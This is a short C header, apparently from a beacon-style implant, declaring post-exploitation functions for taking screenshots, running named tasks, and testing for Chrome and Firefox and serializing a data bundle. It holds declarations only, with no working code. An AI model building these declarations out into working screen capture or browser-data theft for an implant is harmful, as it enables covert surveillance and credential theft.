// include/postex.h
#pragma once
#include "common.h"

BOOL postex_screenshot(OUT PBYTE* ppBmpData, OUT DWORD* pdwBmpSize);


BOOL postex_run(LPCSTR taskName);

#ifdef BEACON_TEST
BOOL test_postex_chrome_present(void);
BOOL test_postex_chrome_missing(void);
BOOL test_postex_firefox_present(void);
BOOL test_postex_firefox_missing(void);
BOOL test_postex_serialize_bundle(void);
BOOL test_postex_screenshot(void);
#endif
